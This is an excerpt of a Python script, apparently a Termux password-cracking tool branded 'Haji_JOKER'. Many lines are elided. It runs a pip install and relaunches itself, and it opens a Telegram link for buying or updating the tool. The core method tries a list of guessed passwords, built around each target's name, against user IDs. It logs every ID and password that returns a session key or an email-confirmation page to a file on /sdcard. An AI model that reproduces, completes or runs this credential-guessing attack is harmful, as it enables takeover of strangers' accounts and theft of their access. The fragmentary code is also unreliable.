...
try:
        ...
        os.system('pip install futures==2 && python Haji.py')
...
def qsbuy():
        try:
                ...
                if str("upppdate") in update:
                        ...
                        print(50*"-")
                        input("[]")
                        os.system(f"termux-open-url https://t.me/+qIFtdj5Dv2ZmYzg1text={bumper}")
                        qsbuy()
...
class crack_main():
        ...
        def m1(self,iid,name,passlist):
                try:
                        ...
                        sys.stdout.write('\r[Haji_JOKER] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                        fn = name.split(' ')[0]
                        try:
                                ln = name.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in po:
                                        print(' \033[1;32m[Haji_JOKER-OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/Haji_JOKER_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
                                elif 'Please Confirm Email' in po:
                                        print(' \033[1;32m[Haji_JOKER] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/Haji_JOKER_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
                                else:
